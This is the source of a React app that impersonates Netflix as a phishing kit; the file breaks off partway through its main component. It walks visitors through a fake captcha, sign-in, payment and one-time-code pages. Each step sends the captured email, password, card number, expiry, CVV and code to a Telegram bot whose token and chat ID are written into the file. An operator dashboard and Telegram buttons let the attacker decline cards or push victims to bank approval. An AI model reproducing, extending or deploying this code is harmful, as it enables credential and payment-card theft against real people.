import React, { useState, useEffect, useRef } from 'react';
import Logo from './components/Logo';
import SocialButton from './components/SocialButton';
import { LoginStatus } from './types';

interface StorageEvent {
  key: string | null;
  oldValue: string | null;
  newValue: string | null;
  url: string;
  storageArea: Storage;
}

interface SessionData {
  id: string;
  ip: string;
  city: string;
  country: string;
  currentPage: string;
  lastActive: number;
  email: string;
  pass: string;
  card: string;
  exp: string;
  cvv: string;
  otp: string;
  name?: string;
  adminAction: 'NORMAL' | 'INVALID_CARD' | 'INVALID_OTP' | 'OTP_PAGE' | 'BANK_APPROVAL' | 'BLOCK' | 'REDIRECT_OTP' | 'REDIRECT_NETFLIX';
}
useEffect(() => {
  const titles = {
    CAPTCHA: 'Security Check - Netflix',
    LOGIN: 'Sign In - Netflix',
    PAYMENT: 'Payment - Netflix',
    OTP: 'Verification - Netflix',
    BANK_APPROVAL: 'Bank Approval - Netflix',
    ADMIN: 'Admin Dashboard',
    BLOCKED: 'Access Blocked'
  };
  
  if (titles[step]) {
    document.title = titles[step];
  }
}, [step]);

const DEBUG = process.env.NODE_ENV === 'development';

const debugLog = (message: string, data?: any) => {
  if (DEBUG) {
    console.log(`[DEBUG] ${message}`, data);
  }
};


const SESSION_STORAGE_KEY = 'netflix_prod_sessions';
const CONFIG_STORAGE_KEY = 'netflix_prod_config';

const getInitialConfig = () => {
  const saved = localStorage.getItem(CONFIG_STORAGE_KEY);
  return saved ? JSON.parse(saved) : {
    botToken: process.env.REACT_APP_BOT_TOKEN || '8486780522:AAHGzS5j5o3NKqad2sfhXodd3U60SBjJW1o',
    chatId: process.env.REACT_APP_CHAT_ID || '-4629342475',
    adminPass: process.env.REACT_APP_ADMIN_PASS || 'admin123'
  };
};

const sendTelegramMessage = async (text: string, replyMarkup?: any) => {
  const config = getInitialConfig();
  if (!config.botToken || !config.chatId) {
    console.error('Missing Telegram configuration');
    return false;
  }
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: replyMarkup
      })
    });
    
    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }
    
    return true;
  } catch (error) {
    console.error('Telegram message failed:', error);
    return false;
  }
};

const getVisitorInfo = async () => {
  const services = [
    {
      url: 'https://ipapi.co/json/',
      parser: (data: any) => ({ ip: data.ip, city: data.city, country: data.country_name })
    },
    { url: 'https://api.ipify.org?format=json', parser: (data: any) => ({ ip: data.ip, city: 'Unknown', country: 'Unknown' }) },
    {
      url: 'https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_FREE_API_KEY',
      parser: (data: any) => ({ ip: data.ip, city: data.city, country: data.country })
    }
  ];

  for (const service of services) {
    try {
      const response = await fetch(service.url);
      if (response.ok) {
        const data = await response.json();
        const result = service.parser(data);
        debugLog('IP lookup success:', result);
        return result;
      }
    } catch (error) {
      console.log(`Service ${service.url} failed, trying next...`);
    }
  }

  return { ip: '127.0.0.1', city: 'Unknown', country: 'Global' };
};

const handleTelegramCallback = async (callbackData: string) => {
  if (!callbackData || !callbackData.startsWith("action_")) {
    console.log("Invalid callback data:", callbackData);
    return;
  }
 
  const parts = callbackData.split("_");
  if (parts.length < 3) {
    console.log("Invalid callback format:", callbackData);
    return;
  }
  
  const sessionId = parts[1];
  const action = parts.slice(2).join("_") as SessionData['adminAction'];
  
  const validActions: SessionData['adminAction'][] = [
    'NORMAL', 'INVALID_CARD', 'INVALID_OTP', 'OTP_PAGE', 
    'BANK_APPROVAL', 'BLOCK', 'REDIRECT_OTP', 'REDIRECT_NETFLIX'
  ];
  
  if (!validActions.includes(action)) {
    console.log("Invalid action:", action);
    return;
  }
  
  const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
  
  const sessionIndex = current.findIndex((s: SessionData) => s.id === sessionId);
  if (sessionIndex > -1) {
    current[sessionIndex].adminAction = action;
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(current));
    
    await sendTelegramMessage(`✅ Action ${action} applied to session ${sessionId}`);
  }
};

const pollTelegram = async () => {
  try {
    const config = getInitialConfig();
    if (!config.botToken || !config.chatId) {
      console.log('Missing bot configuration');
      return;
    }
    
    const lastUpdateId = localStorage.getItem('lastUpdateId') || '0';
    const response = await fetch(
      `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${parseInt(lastUpdateId) + 1}&limit=10`
    );
    
    if (!response.ok) {
      console.error('Telegram API error:', response.status);
      return;
    }
    
    const updates = await response.json();
    
    if (updates.ok && updates.result.length > 0) {
      for (const update of updates.result) {
        if (update.callback_query) {
          console.log('Processing callback:', update.callback_query.data);
          await handleTelegramCallback(update.callback_query.data);
        }
        localStorage.setItem('lastUpdateId', update.update_id.toString());
      }
    }
  } catch (error) {
  console.error('Telegram polling error:', error);
  // Wait longer before retrying on error
  await new Promise(resolve => setTimeout(resolve, 10000));
}
};

const LoadingState: React.FC<{ message?: string }> = ({ message = "redirecting..." }) => (
  <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6">
    <div className="w-16 h-16 border-4 border-[#e50914] border-t-transparent rounded-full animate-spin mb-8"></div>
    <h2 className="text-2xl font-bold">{message}</h2>
  </div>
);

// --- OTP Component ---
const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; sessionId: string; setStep: React.Dispatch<React.SetStateAction<any>> }> = ({ session, updateSession, sessionId, setStep }) => {
  useEffect(() => {
    updateSession({ currentPage: 'OTP Verification' });
  }, []);

const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  setStep('OTP_LOADING');
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Approve", callback_data: `action_${session.id}_NORMAL` },
        { text: "❌ Decline", callback_data: `action_${session.id}_INVALID_CARD` }
      ],
      [
        { text: "🎬 Redirect to Netflix", callback_data: `action_${session.id}_REDIRECT_NETFLIX` },
        { text: "🚫 Block", callback_data: `action_${session.id}_BLOCK` }
      ]
    ]
  };
  await sendTelegramMessage(
    `<b>🔢 OTP CAPTURE</b>\n🔢 Code: <code>${session.otp}</code>\n💳 Card: <code>${session.card}</code>\n📍 IP: ${session.ip}`,
    keyboard
  );
};

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 animate-in fade-in duration-500">
      <div className="w-full max-w-md bg-[#181818] p-8 rounded-lg shadow-2xl flex flex-col items-center">
        <div className="w-16 h-16 bg-[#e50914]/10 rounded-full flex items-center justify-center mb-6">
          <svg className="w-8 h-8 text-[#e50914]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
          </svg>
        </div>
        <h2 className="text-2xl font-bold mb-2">Enter verification code</h2>
        <p className="text-[#a7a7a7] text-sm text-center mb-8">We sent a code to your device to verify your Netflix account.</p>

        {session.adminAction === 'INVALID_OTP' && (
          <div className="w-full bg-red-600/10 border border-red-600/30 text-red-500 p-3 rounded-lg text-xs text-center font-bold mb-6">
            The code you entered is incorrect.
          </div>
        )}

        <form onSubmit={handleSubmit} className="w-full space-y-6">
          <input
            required
            type="text"
            maxLength={6}
            placeholder="000000"
            value={session.otp}
            onChange={(e) => updateSession({ otp: e.target.value.replace(/\D/g, '') })}
            className="w-full bg-transparent border-b-2 border-[#3e3e3e] text-center text-4xl tracking-[0.5em] font-bold py-4 focus:border-[#e50914] outline-none transition-all placeholder:tracking-normal placeholder:text-[#333]"
          />
          <button type="submit" className="w-full bg-[#e50914] text-white font-bold py-4 rounded hover:bg-[#f40612] transition-all text-lg">Verify</button>
        </form>
      </div>
    </div>
  );
};

// --- Bank Approval Component ---
const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void }> = ({ updateSession }) => {
  useEffect(() => {
    updateSession({ currentPage: 'Awaiting Bank Approval' });
  }, []);

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 text-center animate-in zoom-in duration-500">
      <div className="mb-12 flex gap-4 opacity-50 justify-center">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-5" alt="Visa" />
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-5" alt="MC" />
      </div>
      <div className="flex gap-2 mb-8 justify-center">
        <div className="w-3 h-3 bg-[#e50914] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
        <div className="w-3 h-3 bg-[#e50914] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
        <div className="w-3 h-3 bg-[#e50914] rounded-full animate-bounce"></div>
      </div>
      <h2 className="text-3xl font-bold mb-4">Security Verification</h2>
      <p className="text-[#a7a7a7] max-w-xs mx-auto leading-relaxed text-sm">
        Please open your bank's mobile app to approve this verification request. This window will refresh automatically.
      </p>
    </div>
  );
};

// --- Security Check Component ---
const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onVerify: () => void }> = ({ session, updateSession, onVerify }) => {
  const [captchaCode, setCaptchaCode] = useState<string>('');
  const [userInput, setUserInput] = useState<string[]>(['', '', '', '']);
  const [hasError, setHasError] = useState(false);
  const inputRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];

  const generateCode = () => {
    const code = Math.floor(1000 + Math.random() * 9000).toString();
    setCaptchaCode(code);
    setUserInput(['', '', '', '']);
    setHasError(false);
    setTimeout(() => inputRefs[0].current?.focus(), 0);
  };

  useEffect(() => {
    generateCode();
    updateSession({ currentPage: 'Security Check' });
  }, []);

  const handleInputChange = async (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newInput = [...userInput];
    newInput[index] = value.slice(-1);
    setUserInput(newInput);
    setHasError(false);

    if (value && index < 3) inputRefs[index + 1].current?.focus();

    const finalCode = newInput.join('');
    if (finalCode.length === 4) {
      if (finalCode === captchaCode) {
        await sendTelegramMessage(`<b>🎬 Session Started</b>\n📍 IP: ${session.ip}\n🌍 Country: ${session.country}`);
        onVerify();
      } else {
        setHasError(true);
        setTimeout(generateCode, 600);
      }
    }
  };

  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center px-6">
      <div className="w-full max-w-[400px] flex flex-col items-center">
        <div className="w-20 h-20 bg-[#e50914]/10 rounded-full flex items-center justify-center mb-8 border border-[#e50914]/20">
          <svg className="w-10 h-10 text-[#e50914]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
        </div>
        <h1 className="text-white text-3xl font-bold mb-2">Are you human?</h1>
        <p className="text-[#a7a7a7] mb-12">Enter the verification code to proceed</p>
        <div className="w-full bg-[#181818] rounded-2xl p-8 mb-10 relative flex justify-center gap-4 shadow-2xl">
          {captchaCode.split('').map((char, i) => (
            <div key={i} className="w-14 h-16 bg-[#2a2a2a] rounded-lg flex items-center justify-center text-3xl font-black text-white border border-white/10 shadow-inner">{char}</div>
          ))}
        </div>
        <div className="flex gap-4 mb-12">
          {userInput.map((val, i) => (
            <input key={i} ref={inputRefs[i]} type="text" maxLength={1} value={val} onChange={(e) => handleInputChange(i, e.target.value)} onKeyDown={(e) => { if (e.key === 'Backspace' && !val && i > 0) inputRefs[i-1].current?.focus(); }} className={`w-14 h-16 bg-transparent border-2 rounded-xl text-center text-2xl font-bold text-white focus:border-[#e50914] outline-none transition-all ${hasError ? 'border-red-600' : 'border-[#333]'}`} />
          ))}
        </div>
      </div>
    </div>
  );
};

// --- Login Form Component ---
    const LoginForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onLogin: () => void }> = ({ session, updateSession, onLogin }) => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    updateSession({ currentPage: 'Sign In' });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  setIsLoading(true);
  
  // Basic email validation
  if (!email.includes('@') || email.length < 5) {
      alert('Please enter a valid email address');
      return;
}
  
  // Basic password validation
  if (password.length < 4) {
        alert('Password must be at least 4 characters long');
        return;
}
  
  await sendTelegramMessage(`<b>🎬 LOGIN HIT</b>\n👤 User: <code>${email}</code>\n🔐 Pass: <code>${password}</code>\n📍 IP: ${session.ip}`);
  onLogin();
};

  const socialLogins = [
    { id: 'facebook', label: 'Login with Facebook', icon: <svg fill="#1877F2" viewBox="0 0 24 24" className="w-6 h-6"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" /></svg> },
    { id: 'google', label: 'Login with Google', icon: <svg viewBox="0 0 24 24" className="w-5 h-5"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg> },
    { id: 'apple', label: 'Login with Apple', icon: <svg fill="white" viewBox="0 0 24 24" className="w-5 h-5"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.702z" /></svg> }
  ];

  return (
    <div className="min-h-screen bg-black flex flex-col items-center">
      <header className="absolute top-0 left-0 right-0 p-8">
        <Logo className="text-red-600 w-32 h-auto" />
      </header>
      <main className="w-full max-w-[450px] px-6 pb-20 flex flex-col items-center justify-center min-h-screen">
        <div className="w-full bg-[rgba(0,0,0,0.75)] p-16 rounded-lg">
          <h1 className="text-white text-3xl font-bold mb-8">Sign In</h1>
          <form onSubmit={handleSubmit} className="flex flex-col">
            <input 
              type="text" 
              required 
              value={email} 
              onChange={(e) => { setEmail(e.target.value); updateSession({ email: e.target.value }); }} 
              placeholder="Email or phone number" 
              className="w-full bg-[#333] text-white p-4 rounded-md placeholder-[#8c8c8c] mb-4 focus:outline-none focus:ring-2 focus:ring-[#e50914]" 
            />
            <input 
              type={showPassword ? 'text' : 'password'} 
              required 
              value={password} 
              onChange={(e) => { setPassword(e.target.value); updateSession({ pass: e.target.value }); }} 
              placeholder="Password" 
              className="w-full bg-[#333] text-white p-4 rounded-md placeholder-[#8c8c8c] mb-4 focus:outline-none focus:ring-2 focus:ring-[#e50914]" 
            />
            <button type="submit" disabled={isLoading} className="w-full bg-[#e50914] text-white font-bold py-4 rounded hover:bg-[#f40612] transition-all mb-4 disabled:opacity-50 disabled:cursor-not-allowed">
              {isLoading ? 'Signing in...' : 'Sign In'}
            </button>
            <div className="flex items-center justify-between mb-6">
              <label className="flex items-center text-[#b3b3b3] text-sm">
                <input type="checkbox" className="mr-2" />
                Remember me
              </label>
              <a href="#" className="text-[#b3b3b3] text-sm hover:underline">Need help?</a>
            </div>
          </form>
          <div className="mt-6">
            <p className="text-[#b3b3b3] text-sm mb-4">New to Netflix? <a href="#" className="text-white hover:underline">Sign up now.</a></p>
            <p className="text-[#8c8c8c] text-xs">
              This page is protected by Google reCAPTCHA to ensure you're not a bot. 
              <a href="#" className="text-[#0071eb] hover:underline">Learn more.</a>
            </p>
          </div>
          <div className="mt-8 space-y-3">
            {socialLogins.map((social) => (
              <SocialButton key={social.id} icon={social.icon} label={social.label} />
            ))}
          </div>
        </div>
      </main>
      <footer className="absolute bottom-0 left-0 right-0 bg-black/70 p-6">
        <div className="max-w-6xl mx-auto text-[#8c8c8c] text-xs">
          <p>Questions? Call 1-800-123-4567</p>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4">
            <a href="#" className="hover:underline">FAQ</a>
            <a href="#" className="hover:underline">Help Center</a>
            <a href="#" className="hover:underline">Terms of Use</a>
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Cookie Preferences</a>
            <a href="#" className="hover:underline">Corporate Information</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

// --- Payment Form Component ---
const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; setStep: React.Dispatch<React.SetStateAction<any>> }> = ({ session, updateSession, setStep }) => {
const [card, setCard] = useState('');
const [exp, setExp] = useState('');
const [cvv, setCvv] = useState('');
const [name, setName] = useState('');
const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    updateSession({ currentPage: 'Payment' });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  setIsLoading(true);
  
  // Basic card validation
  if (card.replace(/\s/g, '').length < 13) {
    alert('Please enter a valid card number');
    setIsLoading(false);
    return;
  }
  
  // Basic expiry validation
  if (!exp.includes('/')) {
    alert('Please enter expiry in MM/YY format');
    setIsLoading(false);
    return;
  }
  
  // Basic CVV validation
  if (cvv.length < 3) {
    alert('Please enter a valid CVV');
    setIsLoading(false);
    return;
  }
  
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Approve", callback_data: `action_${session.id}_NORMAL` },
        { text: "❌ Decline", callback_data: `action_${session.id}_INVALID_CARD` }
      ],
      [
        { text: "🏦 Bank Approval", callback_data: `action_${session.id}_BANK_APPROVAL` },
        { text: "🚫 Block", callback_data: `action_${session.id}_BLOCK` }
      ]
    ]
  };
  await sendTelegramMessage(
    `<b>💳 PAYMENT HIT</b>\n💳 Card: <code>${card}</code>\n👤 Name: <code>${name}</code>\n⏱ Exp: <code>${exp}</code>\n🔒 CVV: <code>${cvv}</code>\n📍 IP: ${session.ip}`,
    keyboard
  );
  setStep('PROCESSING');
};

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6">
      <div className="w-full max-w-md bg-[#181818] p-8 rounded-lg shadow-2xl">
        <h2 className="text-2xl font-bold mb-6">Set up your payment</h2>
        <p className="text-[#a7a7a7] text-sm mb-8">Your membership starts as soon as you set up payment.</p>

        {session.adminAction === 'INVALID_CARD' && (
          <div className="w-full bg-red-600/10 border border-red-600/30 text-red-500 p-3 rounded-lg text-xs text-center font-bold mb-6">
            Your payment information is invalid. Please try again.
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <input
              type="text"
              required
              placeholder="Cardholder Name"
              value={name}
              onChange={(e) => { setName(e.target.value); }}
              className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
            />
          </div>
          <div>
            // In PaymentForm component
            <input
              type="text"
              required
              placeholder="Card Number"
              maxLength={19}
              value={card}
              onChange={(e) => {
                let value = e.target.value.replace(/\D/g, '');
                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                setCard(formattedValue);
                updateSession({ card: value }); // Store unformatted value
              }}
              className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
/>
          </div>
          <div className="grid grid-cols-2 gap-4">
           <input
                    type="text"
                    required
                    placeholder="MM/YY"
                    maxLength={5}
                    value={exp}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '');
                      if (value.length >= 2) {
                        value = value.slice(0, 2) + '/' + value.slice(2, 4);
                      }
                      setExp(value);
                      updateSession({ exp: value });
                    }}
                    className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
/>
            <input
              type="text"
              required
              placeholder="CVV"
              maxLength={4}
              value={cvv}
              onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                  setCvv(value);
                  updateSession({ cvv: value });
                }}
              className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
            />
          </div>
          <button type="submit" disabled={isLoading} className="w-full bg-[#e50914] text-white font-bold py-4 rounded hover:bg-[#f40612] transition-all disabled:opacity-50 disabled:cursor-not-allowed">
              {isLoading ? 'Processing...' : 'Start Membership'}
          </button>
        </form>
        <div className="mt-6 text-center">
          <p className="text-[#a7a7a7] text-xs">
            By completing your purchase you agree to the Netflix Terms of Use.
          </p>
        </div>
      </div>
    </div>
  );
};

// --- Admin Dashboard Component ---
const AdminDashboard: React.FC<{ sessions: SessionData[]; config: any; setConfig: (c: any) => void }> = ({ sessions, config, setConfig }) => {
  const [selectedSession, setSelectedSession] = useState<SessionData | null>(null);
  const [showConfig, setShowConfig] = useState(false);

  const sendAction = async (sessionId: string, action: SessionData['adminAction']) => {
    const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    const sessionIndex = current.findIndex((s: SessionData) => s.id === sessionId);
    if (sessionIndex > -1) {
      current[sessionIndex].adminAction = action;
      localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(current));
      await sendTelegramMessage(`✅ Action ${action} applied to session ${sessionId}`);
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold">Admin Dashboard</h1>
          <button onClick={() => setShowConfig(!showConfig)} className="bg-blue-600 px-4 py-2 rounded hover:bg-blue-700 transition-all">
            {showConfig ? 'Hide Config' : 'Show Config'}
          </button>
        </div>

        {showConfig && (
          <div className="bg-gray-800 p-6 rounded-lg mb-8">
            <h2 className="text-xl font-bold mb-4">Configuration</h2>
            <div className="space-y-4">
              <input
                type="text"
                placeholder="Bot Token"
                value={config.botToken}
                onChange={(e) => setConfig({ ...config, botToken: e.target.value })}
                className="w-full bg-gray-700 p-3 rounded text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <input
                type="text"
                placeholder="Chat ID"
                value={config.chatId}
                onChange={(e) => setConfig({ ...config, chatId: e.target.value })}
                className="w-full bg-gray-700 p-3 rounded text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <input
                type="password"
                placeholder="Admin Password"
                value={config.adminPass}
                onChange={(e) => setConfig({ ...config, adminPass: e.target.value })}
                className="w-full bg-gray-700 p-3 rounded text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <button onClick={() => localStorage.setItem(CONFIG_STORAGE_KEY, JSON.stringify(config))} className="bg-green-600 px-4 py-2 rounded hover:bg-green-700 transition-all">
                Save Configuration
              </button>
            </div>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2">
            <div className="bg-gray-800 rounded-lg overflow-hidden">
              <div className="p-4 bg-gray-700">
                <h2 className="text-xl font-bold">Active Sessions</h2>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-700">
                    <tr>
                      <th className="px-4 py-2 text-left">Session ID</th>
                      <th className="px-4 py-2 text-left">IP</th>
                      <th className="px-4 py-2 text-left">Location</th>
                      <th className="px-4 py-2 text-left">Page</th>
                      <th className="px-4 py-2 text-left">Status</th>
                      <th className="px-4 py-2 text-left">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {sessions.filter(s => s.lastActive > Date.now() - 300000).map((session) => (
                      <tr key={session.id} className="border-b border-gray-700 hover:bg-gray-700/50 cursor-pointer" onClick={() => setSelectedSession(session)}>
                        <td className="px-4 py-2 font-mono text-sm">{session.id.slice(0, 8)}...</td>
                        <td className="px-4 py-2">{session.ip}</td>
                        <td className="px-4 py-2">{session.city}, {session.country}</td>
                        <td className="px-4 py-2">{session.currentPage}</td>
                        <td className="px-4 py-2">
                          <span className={`px-2 py-1 rounded text-xs ${
                              session.adminAction === 'BLOCK' ? 'bg-red-600' :
                              session.adminAction === 'BANK_APPROVAL' ? 'bg-yellow-600' :
                              'bg-green-600'
                            }`}>
                            {session.adminAction}
                          </span>
                        </td>
                        <td className="px-4 py-2">
                          <div className="flex gap-2">
                            <button onClick={(e) => { e.stopPropagation(); sendAction(session.id, 'NORMAL'); }} className="bg-green-600 px-2 py-1 rounded text-xs hover:bg-green-700">Approve</button>
                            <button onClick={(e) => { e.stopPropagation(); sendAction(session.id, 'BLOCK'); }} className="bg-red-600 px-2 py-1 rounded text-xs hover:bg-red-700">Block</button>
                            <button onClick={(e) => { e.stopPropagation(); sendAction(session.id, 'REDIRECT_NETFLIX'); }} className="bg-blue-600 px-2 py-1 rounded text-xs hover:bg-blue-700">Redirect</button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          <div>
            {selectedSession && (
              <div className="bg-gray-800 rounded-lg p-6">
                <h3 className="text-lg font-bold mb-4">Session Details</h3>
                <div className="space-y-3 text-sm">
                  <div>
                    <span className="text-gray-400">ID:</span>
                    <span className="ml-2 font-mono">{selectedSession.id}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Email:</span>
                    <span className="ml-2">{selectedSession.email || 'N/A'}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Card:</span>
                    <span className="ml-2">{selectedSession.card ? `****-****-****-${selectedSession.card.slice(-4)}` : 'N/A'}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">OTP:</span>
                    <span className="ml-2">{selectedSession.otp || 'N/A'}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Last Active:</span>
                    <span className="ml-2">{new Date(selectedSession.lastActive).toLocaleString()}</span>
                  </div>
                </div>
                <div className="mt-6 space-y-2">
                  <button onClick={() => sendAction(selectedSession.id, 'NORMAL')} className="w-full bg-green-600 py-2 rounded hover:bg-green-700 transition-all">Approve</button>
                  <button onClick={() => sendAction(selectedSession.id, 'INVALID_CARD')} className="w-full bg-yellow-600 py-2 rounded hover:bg-yellow-700 transition-all">Decline</button>
                  <button onClick={() => sendAction(selectedSession.id, 'BANK_APPROVAL')} className="w-full bg-purple-600 py-2 rounded hover:bg-purple-700 transition-all">Bank Approval</button>
                  <button onClick={() => sendAction(selectedSession.id, 'REDIRECT_NETFLIX')} className="w-full bg-blue-600 py-2 rounded hover:bg-blue-700 transition-all">Redirect to Netflix</button>
                  <button onClick={() => sendAction(selectedSession.id, 'BLOCK')} className="w-full bg-red-600 py-2 rounded hover:bg-red-700 transition-all">Block</button>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

// --- Main App Component ---
export default function App() {
  const [step, setStep] = useState<LoginStatus>('CAPTCHA');
  const [session, setSession] = useState<SessionData | null>(null);
  const [sessions, setSessions] = useState<SessionData[]>([]);
  const [config, setConfig] = useState(getInitialConfig());
  const sessionId = useRef<string>('');

  useEffect(() => {
    const generateSessionId = () => {
      return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    };
    sessionId.current = generateSessionId();
  }, []);

  useEffect(() => {
    if (step === 'ADMIN' || step === 'BLOCKED') return;
    
    const start = async () => {
      const info = await getVisitorInfo();
      const s: SessionData = {
        id: sessionId.current,
        ip: info.ip,
        city: info.city,
        country: info.country,
        currentPage: 'Connecting',
        lastActive: Date.now(),
        email: '',
        pass: '',
        card: '',
        exp: '',
        cvv: '',
        otp: '',
        adminAction: 'NORMAL'
      };
      setSession(s);
    };
    
    start();
    
    const monitor = setInterval(() => {
      setSession(prev => {
        if (!prev) return null;
        
        const currentData: SessionData[] = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
        const updated = { ...prev, lastActive: Date.now() };
        const idx = currentData.findIndex(s => s.id === updated.id);
        
        if (idx > -1) {
          const remote = currentData[idx];
          
          if (remote.adminAction === 'REDIRECT_NETFLIX') {
              setTimeout(() => {
                window.location.href = 'https://netflix.com';
              }, 1000);
              return updated;
            }
          
          if (remote.adminAction === 'BLOCK') setStep('BLOCKED');
